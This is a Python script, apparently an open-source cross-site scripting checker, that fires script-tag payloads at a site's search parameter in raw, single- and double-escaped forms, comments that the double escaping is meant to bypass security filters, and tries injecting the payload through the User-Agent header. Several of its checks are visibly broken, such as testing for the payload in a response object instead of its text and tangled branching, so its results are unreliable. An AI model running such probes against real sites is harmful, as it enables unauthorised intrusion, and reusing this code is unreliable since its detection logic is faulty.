import requests
import sys
import argparse
from colorama import Fore
try:
    from html import escape  # python 3.x
except ImportError:
    from cgi import escape  # python 2.x

# Basic XSS vulneraility checker tool to see if website search parameter is vulnerable to XSS.
# Made by luu176 (github). This is open source for anyone to use & modify :)


usage = """

____  ________________
__  |/ /_  ___/_  ___/
__    /_____ \_____ \ 
_    | ____/ /____/ / 
/_/|_| /____/ /____/  

Usage: python xss_checker.py -u <url> -p <payload, default="<script>alert('test');</script>">
url needs to end with a equal sign such as ?q=... or ?search=... etc

          """

parser = argparse.ArgumentParser(description=usage)

parser.add_argument('-p', type=str, help="payload, default=<script>alert('fsociety');</script>")
parser.add_argument('-u', type=str, help='url')
args = parser.parse_args()




def xss(url, payload):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'}
    encode1 = escape(payload)
    encode2 = escape(encode1) # double encode the payload to bypass security filters  
    print("\n")
    print("no encode:", payload)
    print("encode x1:", encode1)
    print("encode x2:", encode2)

    
    response1 = requests.get(url + payload, headers=headers)
    response2 = requests.get(url + encode1, headers=headers)
    response3 = requests.get(url + encode2, headers=headers)
    print(Fore.BLUE + """
          
          
____  ________________
__  |/ /_  ___/_  ___/
__    /_____ \_____ \ 
_    | ____/ /____/ / 
/_/|_| /____/ /____/  
                      

Trying first payload...
          """)
    vulna = False
    if (response1.status_code == 403) or (not payload in response1.text): #checks if website vulnerable to plain XSS payload with no encoding.
        print(Fore.YELLOW + "[-] First payload might fail") # this is because the payload is ether not seen in the response html code, or the status code is 403.
        if headers["User-Agent"] in response1.text: # keep trying to see if website said something like "attack detected ... your browser: (User-Agent)". If the user agent goes on the website we can modify it to see if the website is vulnerable to xss using this strategy.
            print("[+] FOUND A POSSIBLE ENTRY. Modifying User-Agent to an XSS payload...")
            if payload in requests.get(url + payload, headers={'User-Agent': payload}):
                vuln = "[+] Changing User-Agent to an XSS payload is a vulnerability"
                print(vuln)
                vulna = True
                return True
            else:
                print("[-] Not vulnerable to User-Agent based XSS, skipping")
        else:
            print("[-] Not vulnerable to User-Agent based XSS, skipping")
        if (response2.status_code == 403) or (not payload in response2.text):
            print("[-] Second payload might fail")
            if headers["User-Agent"] in response2.text:
                print("[+] FOUND A POSSIBLE ENTRY. Modifying User-Agent to an XSS payload...")
                if payload in requests.get(url + encode1, headers={'User-Agent': payload}):
                    vuln = "[+] Changing User-Agent to an XSS payload is a vulnerability"
                    print(vuln)
                    vulna = True
                    return True
                else:
                    print("[-] Not vulnerable to User-Agent based XSS, skipping")
            else:
                print("[-] Not vulnerable to User-Agent based XSS, skipping")
        if (response3.status_code == 403) or (not payload in response3.text): 
            print("[-] Third payload might fail")
            if headers["User-Agent"] in response3.text:
                print("[+] FOUND A POSSIBLE ENTRY. Modifying user agent to an XSS payload...")
                if payload in requests.get(url + encode2, headers={'User-Agent': payload}):
                    vuln = "[+] Changing User-Agent to an XSS payload is a vulnerability"
                    print(vuln)
                    vulna = True
                    return True
                else:
                    print("[-] Not vulnerable to User-Agent based XSS, skipping")
            else:
                print("[-] Not vulnerable to User-Agent based XSS, skipping")
        elif payload in response3.text:
            vuln = f"Vulnerable to encoding payload 1 time: {url + encode2}"
            print(vuln)
            vulna = True
            return True
        elif payload in response2.text:
            vuln = f"[+] Vulnerable to encoding payload 1 time: {url + encode1}"
            print(vuln)
            vulna = True
            return True
    elif payload in response1.text:
        vuln = f"[+] WEBSITE MAY BE VULNERABLE TO XSS: {url + payload}"
        print(vuln)
        vulna = True
        return True
    if vulna == False:
        print(Fore.RED + """

        _ _  ___  ___   _ _  _ _  _    _ _  ___  ___  ___  ___  _    ___ 
        | \ || . ||_ _| | | || | || |  | \ || __>| . \| . || . >| |  | __>
        |   || | | | |  | ' || ' || |_ |   || _> |   /|   || . \| |_ | _> 
        |_\_|`___' |_|  |__/ `___'|___||_\_||___>|_\_\|_|_||___/|___||___>
                                                                        
        check it yourself to make sure, don't be a script kiddie.  

            """)
        return False
    
default_payload = "<script>alert('fsociety');</script>"

vulnerable = Fore.GREEN + """
              
 _ _  _ _  _    _ _  ___  ___  ___  ___  _    ___ 
| | || | || |  | \ || __>| . \| . || . >| |  | __>
| ' || ' || |_ |   || _> |   /|   || . \| |_ | _> 
|__/ `___'|___||_\_||___>|_\_\|_|_||___/|___||___>
                                                  

              """
if args.p:
    payload = args.p
else:
    payload = default_payload

if args.u:
    url = args.u
else:
    print(usage)
    exit()

if (not url.endswith("=")):
    print(usage)
    exit()
elif (not (url.startswith('http') or url.startswith('https'))):
    url = 'http://' + url
    if xss(url, payload):
        print(vulnerable)
else:
    if xss(url, payload):
        print(vulnerable)


